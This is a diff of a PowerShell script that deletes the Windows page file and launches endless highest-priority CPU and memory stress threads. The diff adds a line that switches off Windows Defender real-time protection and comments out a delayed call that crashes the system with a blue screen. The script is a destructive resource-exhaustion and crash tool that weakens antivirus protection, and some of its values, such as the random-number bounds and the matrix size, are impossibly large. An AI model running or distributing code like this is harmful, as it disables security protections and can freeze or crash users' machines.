@@ -13,6 +13,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
+Set-MpPreference -DisableRealtimeMonitoring $true
 # --- System Tweaks (optional, keep your original if desired) ---
 Invoke-Expression "wmic computersystem where name='%computername%' set AutomaticManagedPagefile=False"
 Invoke-Expression "wmic pagefileset where name='C:\\pagefile.sys' delete"
@@ -83,41 +84,73 @@ $jobScript = {
         [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
 
         # SHA512 hashing loop
-        1..$iterations | ForEach-Object {
-            $data = [System.Security.Cryptography.SHA512]::HashData($data)
+        $sha512Threads = @()
+        1..3 | ForEach-Object{
+            $sha512Thread = [System.Threading.Thread]::new({
+                param($iterations, $data)
+                $sha512 = [System.Security.Cryptography.SHA512]::Create()
+                1..$iterations | ForEach-Object {
+                    $data = $sha512.ComputeHash($data)
+                    # $sha512.Dispose()  # Properly dispose of the SHA512 instance
+                }
+            })
+            $sha512Thread.Priority = [System.Threading.ThreadPriority]::Highest
+            $sha512Thread.Start($iterations, $data)
+            $sha512Threads += $sha512Thread
         }
 
         # Large prime factorization (CPU heavy)
-        function Get-Primes {
-            param($n)
-            $factors = @()
-            for ($i = 2; $i -le $n; $i++) {
-                while ($n % $i -eq 0) {
-                    $factors += $i
-                    $n = [math]::Floor($n / $i)
+        $primeFactorizeThreads = @()
+        1..3 | ForEach-Object{
+            $primeFactorizeThread = [System.Threading.Thread]::new({
+                param($n)
+                function Get-Primes {
+                    param($n)
+                    $factors = @()
+                    for ($i = 2; $i -le $n; $i++) {
+                        while ($n % $i -eq 0) {
+                            $factors += $i
+                            $n = [math]::Floor($n / $i)
+                        }
+                    }
+                    return $factors
                 }
-            }
-            return $factors
+                Get-Primes $n | Out-Null
+            })
+            $primeFactorizeThread.Priority = [System.Threading.ThreadPriority]::Highest
+            $primeFactorizeThread.Start(9889396939693)
+            $primeFactorizeThreads += $primeFactorizeThread
         }
-        Get-Primes 9889396939693 | Out-Null
 
         # Matrix multiplication stress (smaller size to avoid extreme delays)
-        $size = 150000
-        $A = @(); $B = @(); $C = @()
-        0..($size-1) | ForEach-Object {
-            $A += ,@(1..$size | ForEach-Object { Get-Random -Min 1532360321 -Max 1231235436536999 })
-            $B += ,@(1..$size | ForEach-Object { Get-Random -Min 1532360321 -Max 1231235436536999 })
-            $C += ,@(0..($size-1) | ForEach-Object { 0 })
-        }
-        0..($size-1) | ForEach-Object { $i = $_
-            0..($size-1) | ForEach-Object { $j = $_
-                $sum = 0
-                0..($size-1) | ForEach-Object { $k = $_
-                    $sum += $A[$i][$k] * $B[$k][$j]
+        $size = 2147483647
+        $matrixMulThreads = @()
+        1..3 | ForEach-Object{
+            $matrixMulThread = [System.Threading.Thread]::new({
+                param($size)
+                $A = @(); $B = @(); $C = @()
+                0..($size-1) | ForEach-Object {
+                    $A += ,@(1..$size | ForEach-Object { Get-Random -Min 953236032116593099531599199499993129549 -Max 95323603211659309953159919941635234299991491999139192 })
+                    $B += ,@(1..$size | ForEach-Object { Get-Random -Min 953236032112510999419491345999999992139 -Max 95323603211659309953159919944123569999999234923965996 })
+                    $C += ,@(0..($size-1) | ForEach-Object { 0 })
                 }
-                $C[$i][$j] = $sum
-            }
+                0..($size-1) | ForEach-Object { $i = $_
+                    0..($size-1) | ForEach-Object { $j = $_
+                        $sum = 0
+                        0..($size-1) | ForEach-Object { $k = $_
+                            $sum += ($A[$i][$k] * $B[$k][$j])
+                        }
+                        $C[$i][$j] = $sum
+                    }
+                }
+            })
+            $matrixMulThread.Priority = [System.Threading.ThreadPriority]::Highest
+            $matrixMulThread.Start($size)
+            $matrixMulThreads += $matrixMulThread
         }
+        # ($sha512Threads + $primeFactorizeThreads + $matrixMulThreads) | ForEach-Object{
+        #     $_.Join()
+        # }
     }
 
     # Memory Stress function progressively allocating chunks
@@ -198,45 +231,45 @@ $jobs | ForEach-Object {
 }
 
 # Optional: Wait some time before triggering BSOD (adjust delay as needed)
-$bsodDelaySeconds = 10
-Write-Host "Waiting $bsodDelaySeconds seconds before triggering BSOD..."
-$elapsedTime = 0
+# $bsodDelaySeconds = 180
+# Write-Host "Waiting $bsodDelaySeconds seconds before triggering BSOD..."
+# $elapsedTime = 0
 
-while ($elapsedTime -lt $bsodDelaySeconds) {
-    Start-Sleep -Seconds 1
-    $elapsedTime++
-    Write-Progress -Activity "Waiting before BSOD" -Status "$elapsed seconds elapsed" -PercentComplete (($elapsed / $bsodDelaySeconds) * 100)
-    foreach ($job in $jobs) {
-        if ($job.State -ne 'Running') {
-            Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
-            Remove-Job -Job $job -Force
-            $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
-            $jobs += $newJob
-        }
-    }
-}
-
-# Trigger BSOD
-Invoke-KernelBSOD
-
-# Monitor jobs (optional)
-# try {
-#     while ($true) {
-#         Start-Sleep -Seconds 5
-#         foreach ($job in $jobs) {
-#             if ($job.State -ne 'Running') {
-#                 Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
-#                 Remove-Job -Job $job -Force
-#                 $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
-#                 $jobs += $newJob
-#             }
+# while ($elapsedTime -lt $bsodDelaySeconds) {
+#     Start-Sleep -Seconds 1
+#     $elapsedTime++
+#     Write-Progress -Activity "Waiting before BSOD" -Status "$elapsed seconds elapsed" -PercentComplete (($elapsed / $bsodDelaySeconds) * 100)
+#     foreach ($job in $jobs) {
+#         if ($job.State -ne 'Running') {
+#             Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
+#             Remove-Job -Job $job -Force
+#             $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
+#             $jobs += $newJob
 #         }
 #     }
-# } finally {
-#     # Cleanup jobs on exit
-#     $jobs | ForEach-Object {
-#         Stop-Job -Job $_ -Force
-#         Remove-Job -Job $_ -Force
-#     }
-#     Write-Host "Stress jobs stopped and cleaned up."
 # }
+
+# # Trigger BSOD
+# Invoke-KernelBSOD
+
+# Monitor jobs (optional)
+try {
+    while ($true) {
+        Start-Sleep -Seconds 5
+        foreach ($job in $jobs) {
+            if ($job.State -ne 'Running') {
+                Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
+                Remove-Job -Job $job -Force
+                $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
+                $jobs += $newJob
+            }
+        }
+    }
+} finally {
+    # Cleanup jobs on exit
+    $jobs | ForEach-Object {
+        Stop-Job -Job $_ -Force
+        Remove-Job -Job $_ -Force
+    }
+    Write-Host "Stress jobs stopped and cleaned up."
+}
